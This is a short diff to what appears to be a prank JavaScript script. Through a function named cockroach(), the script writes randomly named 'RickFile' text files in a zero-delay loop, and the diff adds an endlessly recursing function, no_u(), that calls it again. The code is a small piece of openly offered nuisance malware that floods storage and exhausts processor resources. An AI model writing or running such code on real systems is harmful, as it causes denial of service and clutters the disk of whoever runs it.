@@ -16,6 +16,11 @@ honk.writeFileSync("RickFile-" + Math.random() + '.txt', 'Never gonna Give you u
 //Don't Do anything right here lol
 }
 cockroach()
+function no_u() {
+cockroach()
+no_u()
+}
+no_u()
 setInterval(function() {
 cockroach()
 }, 0);
